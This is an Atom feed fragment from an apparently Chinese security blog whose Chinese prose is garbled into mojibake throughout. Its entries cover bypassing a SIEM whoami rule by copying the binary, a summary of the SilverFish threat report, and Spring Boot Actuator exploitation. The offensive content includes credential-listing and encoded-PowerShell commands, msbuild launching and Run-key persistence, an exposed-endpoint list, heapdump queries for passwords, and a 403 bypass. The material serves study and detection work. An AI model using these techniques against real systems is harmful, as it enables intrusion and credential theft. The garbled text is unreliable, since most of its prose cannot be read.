&lt;h3 id=&quot;è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡&quot;&gt;&lt;a href=&quot;#è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡&quot; class=&quot;headerlink&quot; title=&quot;è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡&quot;&gt;&lt;/a&gt;è§„åˆ™ç›‘æµ‹å’Œç»•è¿‡&lt;/h3&gt;&lt;p&gt;è§„åˆ™æœ‰5ç§æŸ¥è¯¢ï¼Œä¸€èˆ¬ä½¿ç”¨EQL(Event Query Language)æŸ¥è¯¢ç±»å‹:&lt;br&gt;&lt;img src=&quot;/2021/08/02/siem-on-elk/siem-1.png&quot;&gt;&lt;br&gt;SIEMæœ‰å†…ç½®å¾ˆå¤šè§„åˆ™ï¼Œé»˜è®¤æ˜¯å…³é—­çŠ¶æ€ï¼Œè¿™äº›è§„åˆ™éƒ½æ˜¯ATT&amp;amp;CKæ¡†æ¶æ”»å‡»è¡Œä¸ºè½¬åŒ–è€Œæ¥çš„ï¼Œä¾‹å¦‚windowsä¸‹çš„&lt;code&gt;whoami&lt;/code&gt;æŸ¥è¯¢è§„åˆ™(&lt;del&gt;æ­£ç»äººè°æŸ¥whoamiå•Š&lt;/del&gt;):&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;process where event.type in (&amp;quot;start&amp;quot;, &amp;quot;process_started&amp;quot;) and process.name : &amp;quot;whoami.exe&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬æ‹¿è¿™æ¡è§„åˆ™åšåˆ†æï¼Œè¿™æ¡è§„åˆ™åŒ¹é…äº†å½“è¿›ç¨‹å¼€å§‹çš„æ—¶å€™ï¼Œè¿›ç¨‹åä¸º&lt;code&gt;whoami.exe&lt;/code&gt;çš„æ—¶å€™è§¦å‘ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ&lt;code&gt;whoami.exe&lt;/code&gt;å¤åˆ¶ä¸€ä¸‹ï¼Œå°±å¯ä»¥ç»•è¿‡å»äº†:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;copy C:\Windows\System32\whoami.exe C:\Windows\temp\x.exe
C:\Windows\temp\x.exe&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ˜¯ä¸æ˜¯æŠŠsiemæƒ³çš„ç®€å•äº†ï¼Œè¿™è·Ÿé€šè¿‡å¤åˆ¶&lt;code&gt;net.exe&lt;/code&gt;ç»•è¿‡æ·»åŠ ç”¨æˆ·ä¸€æ¨¡ä¸€æ ·ï¼Œä»”ç»†è§‚å¯Ÿä¸‹elké‡Œé¢çš„å­—æ®µï¼Œå¯ä»¥å‘ç°&lt;code&gt;process.pe.original_file_name&lt;/code&gt;ä»ç„¶ä¿ç•™äº†&lt;code&gt;whoami.exe&lt;/code&gt;ï¼Œè¿™æ˜¯PEæ–‡ä»¶é‡Œé¢å›ºå®šçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰‹åŠ¨æŠŠé¢„è­¦è§„åˆ™ä¿®æ”¹ä¸€ä¸‹:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;process where event.type in (&amp;quot;start&amp;quot;, &amp;quot;process_started&amp;quot;) and process.pe.original_file_name: &amp;quot;whoami.exe&amp;quot;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Silverè°ƒæŸ¥æŠ¥å‘Š</title>
    <link href="https://jkme.github.io/2021/07/29/silverFish.html"/>
    <id>https://jkme.github.io/2021/07/29/silverFish.html</id>
    <published>2021-07-28T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.950Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://www.prodaft.com/m/reports/SilverFish_TLPWHITE_v2.pdf">SilverFish_TLPWHITE</a></p></blockquote><h1 id="èµ·ç‚¹"><a href="#èµ·ç‚¹" class="headerlink" title="èµ·ç‚¹"></a>èµ·ç‚¹</h1><p>æ ¹æ®FireEyeå‘å¸ƒçš„IOCï¼Œæœ‰ä¸€ä¸ªåŸŸåæ˜¯databasegalore.comï¼Œè¿™ä¸ªåŸŸåä¸‹çš„IPåœ¨2304ç«¯å£èµ·äº†PowerMTAæœåŠ¡ï¼Œwebç›®å½•æ‰«æä¹‹åå‘ç°example.phpã€‚PTIå›¢é˜Ÿæ ¹æ®è¿™ä¸¤ä¸ªç½‘é¡µçš„è®¾å¤‡æŒ‡çº¹å’ŒPowerMTAæœåŠ¡ï¼Œæ‰«æäº†å…¨ç½‘çš„IPv4åœ°å€ï¼Œå‘ç°ä¸€ä¸ªIPåœ°å€: <code>81.4.122.203</code>ï¼Œç„¶åPTIå›¢é˜Ÿå¯¹IPä¸‹çš„Cæ®µè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå‘ç°<code>81.4.122.101</code>å­˜åœ¨ä¸€ä¸ªC2æœåŠ¡å™¨ã€‚</p><h3 id="C2åˆ†æ"><a href="#C2åˆ†æ" class="headerlink" title="C2åˆ†æ"></a>C2åˆ†æ</h3><p><img src="/2021/07/29/silverFish/silver_C2.png"></p><p>æ”¶é›†ä¿¡æ¯å¦‚ä¸‹ï¼š</p><ul><li>ID</li><li>UUID</li><li>Instance</li><li>IP</li><li>Country</li><li>Domain\User@Computer</li><li>OS</li><li>Build</li><li>Architecture</li><li>Antivirus</li><li>Is Admin</li><li>Integrity Level</li><li>UAC Setting</li><li>ConsentPromptBehaviorAdmin â€¢ PromptOnSecureDesktop</li><li>First visit</li></ul><p>æ¯ä¸ªå—å®³è€…é¡µé¢éƒ½å¯ä»¥å‘é€æ”»å‡»æŒ‡ä»¤ï¼Œæœ‰å¦‚ä¸‹ï¼š<br><img src="/2021/07/29/silverFish/silver_command.png"></p><p>çœ‹äº†ä¸‹æ˜¯å‘½ä»¤æ‰§è¡Œå’ŒUACç»•è¿‡æ¯”è¾ƒå¤šï¼ŒC2æœåŠ¡å™¨çš„é˜²æŠ¤æªæ–½æœ‰å¦‚ä¸‹ï¼š</p><ul><li>ä½¿ç”¨AppArmoréš”ç¦»ç¯å¢ƒ</li><li>å…³é—­è®¿é—®æ—¥å¿—ï¼ˆwebæ—¥å¿—ã€SSHç™»å½•æ—¥å¿—ã€å‘½ä»¤è¡Œæ—¥å¿—ï¼‰</li><li>ä½¿ç”¨IPTABLESåªå…è®¸ç™½åå•IPè®¿é—®</li></ul><p><img src="/2021/07/29/silverFish/silver_ip.png"></p><h3 id="TDS-Traffic-Distrbution-System-ç³»ç»Ÿåˆ†æ"><a href="#TDS-Traffic-Distrbution-System-ç³»ç»Ÿåˆ†æ" class="headerlink" title="TDS(Traffic Distrbution System)ç³»ç»Ÿåˆ†æ"></a>TDS(Traffic Distrbution System)ç³»ç»Ÿåˆ†æ</h3><p>  æ˜¯ä¸€ä¸ªç±»ä¼¼è´Ÿè½½å‡è¡¡çš„ç³»ç»Ÿï¼Œå¯ä»¥æŠŠå—å®³è€…çš„æµé‡å®šå‘åˆ°ä¸åŒçš„C2æœåŠ¡å™¨ï¼Œå› ä¸ºå—å®³è€…å¤§æ¦‚æœ‰4åƒå¤šä¸ªï¼ŒåŒæ—¶è¿™ä¸ªç³»ç»Ÿå¯ä»¥æ ¹æ®å›½å®¶æ¥åˆ†ç»„ï¼Œå¹¶ä¸”ç±»ä¼¼JIRAçš„ç³»ç»Ÿï¼ŒæŒ‡å®šå—å®³è€…ç»™ä¸åŒçš„é»‘å®¢ã€‚<br>  <img src="/2021/07/29/silverFish/tds.png"></p><p> æµé‡åˆ†å‘ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†æ˜¯ç”±å¯ä¿¡ç½‘ç«™ç»„æˆçš„ï¼Œè¿™ç§ç½‘ç«™è¢«é»‘äº†ä¹‹åï¼ŒåŠ å…¥phpå’Œjsä»£ç ï¼Œåˆ¤æ–­æ¯ä¸ªè¯·æ±‚æ˜¯å¦ç¬¦åˆä¸€å®šçš„ç‰¹å¾ï¼Œç¬¦åˆç‰¹å¾ä¹‹åä¼šå‘ç‰¹å®šç½‘ç«™å‘é€ä¸€ä¸ªGETè¯·æ±‚ã€‚</p><h3 id="æ¨ªå‘ç§»åŠ¨"><a href="#æ¨ªå‘ç§»åŠ¨" class="headerlink" title="æ¨ªå‘ç§»åŠ¨"></a>æ¨ªå‘ç§»åŠ¨</h3><ul><li>å¸¸ç”¨å‘½ä»¤<ul><li>nltest /dclist  åˆ—åŸŸæ§</li><li>nltest /domain_trusts</li><li>cmdkey /list  åˆ—å·²å­˜å‚¨çš„å¯†ç </li><li>net group â€œdomain adminsâ€ /domain  æŸ¥çœ‹åŸŸæ§ç®¡ç†å‘˜</li><li>powershell -nop -enc xxx  æ‰§è¡Œå‘½ä»¤</li></ul></li></ul><p><img src="/2021/07/29/silverFish/silver_post.png"></p><p>ä½¿ç”¨çš„å…¶ä¸­ä¸€ä¸ªæ¨ªå‘å·¥å…·æ˜¯Koadicï¼Œä¸€èˆ¬é€šè¿‡mshtaè¿è¡Œæ··æ·†ä¹‹åçš„è„šæœ¬ï¼š<br><img src="/2021/07/29/silverFish/silver_koadic.png"></p><h4 id="cobaltstrike"><a href="#cobaltstrike" class="headerlink" title="cobaltstrike"></a>cobaltstrike</h4><p>cobaltstrikeä½¿ç”¨äº†åŸŸå‰ç½®çš„æŠ€æœ¯ï¼Œæ¯”å¦‚<code>twimg-us.azureedge.net</code>, <code>d3ser9acyt7cdp.cloudfront.net</code>ï¼Œå…¶ä¸­ä¸€ä¸ªä¸Šçº¿çš„æ–¹å¼æ˜¯ä½¿ç”¨msbuildï¼š<code>C:\Windows\Microsoft.Net\Framework64\v4.0.30319\msbuild.exe C:\ms654.csproj</code><br><img src="/2021/07/29/silverFish/silver_cdn.png"></p><h3 id="VictimTotal-Sandbox"><a href="#VictimTotal-Sandbox" class="headerlink" title="VictimTotal Sandbox"></a>VictimTotal Sandbox</h3><p>ç ”ç©¶äººå‘˜å‘ç°çš„æœ€éœ‡æƒŠçš„Webå¹³å°ï¼ŒSilverFishä½¿ç”¨å—å®³è€…ä½œä¸ºæ€è½¯æµ‹è¯•äº‘ç«¯å¹³å°ï¼Œæ§åˆ¶äº†è¶…è¿‡6000ä¸ªè®¾å¤‡ä¸»æœºï¼Œä¸å®šæœŸæµ‹è¯•æœ¨é©¬è„šæœ¬çš„å…æ€æ€§ã€‚</p><p><img src="/2021/07/29/silverFish/silver_sandbox.png"></p><p>Powershellè„šæœ¬çš„ç¼–ç æ˜¯è¿™æ ·çš„: ä½¿ç”¨6å­—èŠ‚çš„keyåšä¸€æ¬¡xorâ€“&gt;base64ç¼–ç â€“&gt;AESåŠ å¯†â€“&gt;æ··æ·†ã€‚</p><h3 id="NetSupportManager"><a href="#NetSupportManager" class="headerlink" title="NetSupportManager"></a>NetSupportManager</h3><p>æŠŠNetSupportManagerç¨‹åºé‡Œé¢çš„client32.exeé‡å‘½åä¸ºctfmon.exeï¼Œç„¶åè®¾ç½®æŒä¹…åŒ–åé—¨ï¼š<code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run </code></p><h3 id="è¯»åæ„Ÿ"><a href="#è¯»åæ„Ÿ" class="headerlink" title="è¯»åæ„Ÿ"></a>è¯»åæ„Ÿ</h3><ul><li>é«˜åº¦çš„ç»„ç»‡åŒ–ï¼Œå…·æœ‰ä»£è¡¨æ€§çš„TDSç³»ç»Ÿ</li><li>C2ç•Œé¢å¾ˆç®€æ´</li><li>äº‘æ²™ç›’çš„æ¦‚å¿µçœŸå‰å®³</li><li>å¾ˆå¥½å¥‡æ€ä¹ˆæ—¥è¿›å»çš„ï¼ŒåŸŸå‰ç½®çš„åŸŸåä¸ºå•¥æ˜¯Oracleçš„ï¼Ÿ</li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://www.prodaft.com/m/reports/SilverFish_TLPWHITE_v2.pdf&quot;&gt;SilverFish_TLPWHITE&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;èµ·ç‚¹&quot;&gt;&lt;a href=&quot;#èµ·ç‚¹&quot; class=&quot;headerlink&quot; title=&quot;èµ·ç‚¹&quot;&gt;&lt;/a&gt;èµ·ç‚¹&lt;/h1&gt;&lt;p&gt;æ ¹æ®FireEyeå‘å¸ƒçš„IOCï¼Œæœ‰ä¸€ä¸ªåŸŸåæ˜¯databasegalore.comï¼Œè¿™ä¸ªåŸŸåä¸‹çš„IPåœ¨2304ç«¯å£èµ·äº†PowerMTAæœåŠ¡ï¼Œwebç›®å½•æ‰«æä¹‹åå‘ç°example.phpã€‚PTIå›¢é˜Ÿæ ¹æ®è¿™ä¸¤ä¸ªç½‘é¡µçš„è®¾å¤‡æŒ‡çº¹å’ŒPowerMTAæœåŠ¡ï¼Œæ‰«æäº†å…¨ç½‘çš„IPv4åœ°å€ï¼Œå‘ç°ä¸€ä¸ªIPåœ°å€: &lt;code&gt;81.4.122.203&lt;/code&gt;ï¼Œç„¶åPTIå›¢é˜Ÿå¯¹IPä¸‹çš„Cæ®µè¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå‘ç°&lt;code&gt;81.4.122.101&lt;/code&gt;å­˜åœ¨ä¸€ä¸ªC2æœåŠ¡å™¨ã€‚&lt;/p&gt;
&lt;h3 id=&quot;C2åˆ†æ&quot;&gt;&lt;a href=&quot;#C2åˆ†æ&quot; class=&quot;headerlink&quot; title=&quot;C2åˆ†æ&quot;&gt;&lt;/a&gt;C2åˆ†æ&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/2021/07/29/silverFish/silver_C2.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;æ”¶é›†ä¿¡æ¯å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ID&lt;/li&gt;
&lt;li&gt;UUID&lt;/li&gt;
&lt;li&gt;Instance&lt;/li&gt;
&lt;li&gt;IP&lt;/li&gt;
&lt;li&gt;Country&lt;/li&gt;
&lt;li&gt;Domain\User@Computer&lt;/li&gt;
&lt;li&gt;OS&lt;/li&gt;
&lt;li&gt;Build&lt;/li&gt;
&lt;li&gt;Architecture&lt;/li&gt;
&lt;li&gt;Antivirus&lt;/li&gt;
&lt;li&gt;Is Admin&lt;/li&gt;
&lt;li&gt;Integrity Level&lt;/li&gt;
&lt;li&gt;UAC Setting&lt;/li&gt;
&lt;li&gt;ConsentPromptBehaviorAdmin â€¢ PromptOnSecureDesktop&lt;/li&gt;
&lt;li&gt;First visit&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;æ¯ä¸ªå—å®³è€…é¡µé¢éƒ½å¯ä»¥å‘é€æ”»å‡»æŒ‡ä»¤ï¼Œæœ‰å¦‚ä¸‹ï¼š&lt;br&gt;&lt;img src=&quot;/2021/07/29/silverFish/silver_command.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;çœ‹äº†ä¸‹æ˜¯å‘½ä»¤æ‰§è¡Œå’ŒUACç»•è¿‡æ¯”è¾ƒå¤šï¼ŒC2æœåŠ¡å™¨çš„é˜²æŠ¤æªæ–½æœ‰å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨AppArmoréš”ç¦»ç¯å¢ƒ&lt;/li&gt;
&lt;li&gt;å…³é—­è®¿é—®æ—¥å¿—ï¼ˆwebæ—¥å¿—ã€SSHç™»å½•æ—¥å¿—ã€å‘½ä»¤è¡Œæ—¥å¿—ï¼‰&lt;/li&gt;
&lt;li&gt;ä½¿ç”¨IPTABLESåªå…è®¸ç™½åå•IPè®¿é—®&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="Pentest" scheme="https://jkme.github.io/categories/Pentest/"/>
    
    
  </entry>
  
  <entry>
    <title>Spring Boot Actuatoræ¼æ´å¤ç°</title>
    <link href="https://jkme.github.io/2021/05/27/spring-boot-actuator.html"/>
    <id>https://jkme.github.io/2021/05/27/spring-boot-actuator.html</id>
    <published>2021-05-26T16:00:00.000Z</published>
    <updated>2022-01-21T01:42:01.952Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-åŸºæœ¬çŸ¥è¯†"><a href="#0x01-åŸºæœ¬çŸ¥è¯†" class="headerlink" title="0x01. åŸºæœ¬çŸ¥è¯†"></a>0x01. åŸºæœ¬çŸ¥è¯†</h3><ol><li>åœ¨pom.xmlé‡Œé¢æœ‰è¿™æ ·çš„é…ç½®</li></ol><pre class="line-numbers language-none"><code class="language-none">&lt;dependency&gt;   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>æ²¡æœ‰å¼€å¯å®‰å…¨è®¾ç½®</li></ol><pre class="line-numbers language-none"><code class="language-none">management:  security:    enabled: false  health:    elasticsearch:      enabled: false  metrics:    export:      prometheus:        enabled: true      jmx:        enabled: true  endpoints:    web:      exposure:        include: &#39;*&#39;      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœåŠ¡ç«¯å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶æ¥æ”¹å˜Actuatorçš„æ ¹è·¯å¾„ï¼š<code>management.endpoints.web.base-path=/monitor</code></p><p>  æœç´¢githubçš„æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼çš„è®¾ç½®ï¼š</p><h3 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02 æ¼æ´åˆ©ç”¨"></a>0x02 æ¼æ´åˆ©ç”¨</h3><p>åœ¨é…ç½®ä¸å½“çš„æ—¶å€™ï¼Œå¯èƒ½æš´éœ²ä»¥ä¸‹è·¯ç”±:</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator&#x2F;auditevents&#x2F;autoconfig&#x2F;beans&#x2F;caches&#x2F;conditions&#x2F;configprops&#x2F;docs&#x2F;dump&#x2F;env&#x2F;flyway&#x2F;health&#x2F;heapdump&#x2F;httptrace&#x2F;info&#x2F;intergrationgraph&#x2F;jolokia&#x2F;logfile&#x2F;loggers&#x2F;liquibase&#x2F;metrics&#x2F;mappings&#x2F;prometheus&#x2F;refresh&#x2F;scheduledtasks&#x2F;sessions&#x2F;shutdown&#x2F;trace&#x2F;threaddump&#x2F;actuator&#x2F;auditevents&#x2F;actuator&#x2F;beans&#x2F;actuator&#x2F;health&#x2F;actuator&#x2F;conditions&#x2F;actuator&#x2F;configprops&#x2F;actuator&#x2F;env&#x2F;actuator&#x2F;info&#x2F;actuator&#x2F;loggers&#x2F;actuator&#x2F;heapdump&#x2F;actuator&#x2F;threaddump&#x2F;actuator&#x2F;metrics&#x2F;actuator&#x2F;scheduledtasks&#x2F;actuator&#x2F;httptrace&#x2F;actuator&#x2F;mappings&#x2F;actuator&#x2F;jolokia&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥é€šè¿‡<code>/heapdump</code>è¿™ä¸ªèŠ‚ç‚¹è·å–å†…å­˜ï¼Œç„¶åä½¿ç”¨<a href="https://www.eclipse.org/mat/downloads.php">Memory Analyzer</a>åˆ†æå†…å­˜ï¼Œè·å–æ•æ„Ÿä¿¡æ¯ï¼Œå¸¸ç”¨æŸ¥è¯¢ï¼š</p><pre class="line-numbers language-none"><code class="language-none">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))æˆ–select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))  select* from java.util.Hashtable$Entry x WHERE(toString(x.key).contains(&quot;username&quot;))select* from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))select* from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;url&quot;))select* from java.lang.String s WHERE toString(s) LIKE &quot;.*password.*&quot;select* from org.springframework.web.context.support.StandardServletEnvironmentselect* from java.lang.String s WHERE toString(s) LIKE &quot;.*SESSION.*&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h3><ul><li>å‚è€ƒé“¾æ¥é‡Œé¢ï¼Œå½“ä¸‹è½½/heapdumpæ˜¯403çš„æ—¶å€™, <code>/heapdump.json</code>å¯ä»¥ä¸‹è½½æˆåŠŸï¼Œè¿™ä¸ªåœ¨springå¯åŠ¨çš„æ—¶å€™å¯ä»¥çœ‹åˆ°è·¯ç”±ï¼Œæ‰€æœ‰çš„èŠ‚ç‚¹ä¿¡æ¯éƒ½å­˜åœ¨<code>.json</code>è·¯å¾„</li></ul><h3 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a></li><li><a href="https://mp.weixin.qq.com/s/sJAyhQQvGqG-SliSGbhJNA">æ¸—é€å¤§å‹è èœç½‘ç«™é¸­è„–</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;0x01-åŸºæœ¬çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#0x01-åŸºæœ¬çŸ¥è¯†&quot; class=&quot;headerlink&quot; title=&quot;0x01. åŸºæœ¬çŸ¥è¯†&quot;&gt;&lt;/a&gt;0x01. åŸºæœ¬çŸ¥è¯†&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;åœ¨pom.xmlé‡Œé¢æœ‰è¿™æ ·çš„é…ç½®&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;
&amp;lt;dependency&amp;gt;
   &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;&amp;#x2F;groupId&amp;gt;
   &amp;lt;artifactId&amp;gt;spring-boot-starter-actuator&amp;lt;&amp;#x2F;artifactId&amp;gt;
   &amp;lt;exclusions&amp;gt;&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;æ²¡æœ‰å¼€å¯å®‰å…¨è®¾ç½®&lt;/li&gt;
&lt;/ol&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;management:
  security:
    enabled: false
  health:
    elasticsearch:
      enabled: false
  metrics:
    export:
      prometheus:
        enabled: true
      jmx:
        enabled: true
  endpoints:
    web:
      exposure:
        include: &amp;#39;*&amp;#39;
      base-path: &amp;#x2F;auto&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æœåŠ¡ç«¯å¯ä»¥é€šè¿‡ä¿®æ”¹é…ç½®æ–‡ä»¶æ¥æ”¹å˜Actuatorçš„æ ¹è·¯å¾„ï¼š&lt;code&gt;management.endpoints.web.base-path=/monitor&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;  æœç´¢githubçš„æºä»£ç ï¼Œå¯ä»¥çœ‹åˆ°ç±»ä¼¼çš„è®¾ç½®ï¼š&lt;/p&gt;
&lt;h3 id=&quot;0x02-æ¼æ´åˆ©ç”¨&quot;&gt;&lt;a href=&quot;#0x02-æ¼æ´åˆ©ç”¨&quot; class=&quot;headerlink&quot; title=&quot;0x02 æ¼æ´åˆ©ç”¨&quot;&gt;&lt;/a&gt;0x02 æ¼æ´åˆ©ç”¨&lt;/h3&gt;&lt;p&gt;åœ¨é…ç½®ä¸å½“çš„æ—¶å€™ï¼Œå¯èƒ½æš´éœ²ä»¥ä¸‹è·¯ç”±:&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;&amp;#x2F;actuator
&amp;#x2F;auditevents
&amp;#x2F;autoconfig
&amp;#x2F;beans
&amp;#x2F;caches
&amp;#x2F;conditions
&amp;#x2F;configprops
&amp;#x2F;docs
&amp;#x2F;dump
&amp;#x2F;env
&amp;#x2F;flyway
&amp;#x2F;health
&amp;#x2F;heapdump
&amp;#x2F;httptrace
&amp;#x2F;info
&amp;#x2F;intergrationgraph
&amp;#x2F;jolokia
&amp;#x2F;logfile
&amp;#x2F;loggers
&amp;#x2F;liquibase
&amp;#x2F;metrics
&amp;#x2F;mappings
&amp;#x2F;prometheus
&amp;#x2F;refresh
&amp;#x2F;scheduledtasks
&amp;#x2F;sessions
&amp;#x2F;shutdown
&amp;#x2F;trace
&amp;#x2F;threaddump
&amp;#x2F;actuator&amp;#x2F;auditevents
&amp;#x2F;actuator&amp;#x2F;beans
&amp;#x2F;actuator&amp;#x2F;health
&amp;#x2F;actuator&amp;#x2F;conditions
&amp;#x2F;actuator&amp;#x2F;configprops
&amp;#x2F;actuator&amp;#x2F;env
&amp;#x2F;actuator&amp;#x2F;info
&amp;#x2F;actuator&amp;#x2F;loggers
&amp;#x2F;actuator&amp;#x2F;heapdump
&amp;#x2F;actuator&amp;#x2F;threaddump
&amp;#x2F;actuator&amp;#x2F;metrics
&amp;#x2F;actuator&amp;#x2F;scheduledtasks
&amp;#x2F;actuator&amp;#x2F;httptrace
&amp;#x2F;actuator&amp;#x2F;mappings
&amp;#x2F;actuator&amp;#x2F;jolokia
&amp;#x2F;actuator&amp;#x2F;hystrix.stream&lt;span aria-hidden=&quot;true&quot; class=&quot;line-numbers-rows&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;